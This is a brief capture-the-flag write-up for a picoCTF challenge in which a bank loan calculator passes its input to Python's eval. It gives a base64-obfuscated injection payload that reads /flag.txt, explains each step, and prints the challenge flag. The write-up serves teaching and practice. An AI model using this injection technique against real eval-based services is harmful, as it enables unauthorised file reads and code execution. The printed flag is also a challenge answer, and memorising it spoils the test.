# 3v@l

## Description

ABC Bank's website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an `eval` function to calculate the loan. Bypassing this will give you Remote Code Execution (RCE). Can you exploit the bank's calculator and read the flag?

Additional details will be available after launching your challenge instance.


```
open(__import__('base64').b64decode('L2ZsYWcudHh0').decode()).read()
```
### Explanation:

1. `__import__('base64')`: Dynamically imports the `base64` module.
    
2. `'L2ZsYWcudHh0'`: This is a **base64-encoded string**.
    
3. `.b64decode('L2ZsYWcudHh0')`: Decodes the base64 string, resulting in '/flag.txt'.


### FLAG - picoCTF{D0nt_Use_Unsecure_f@nctions3ce5e79c}
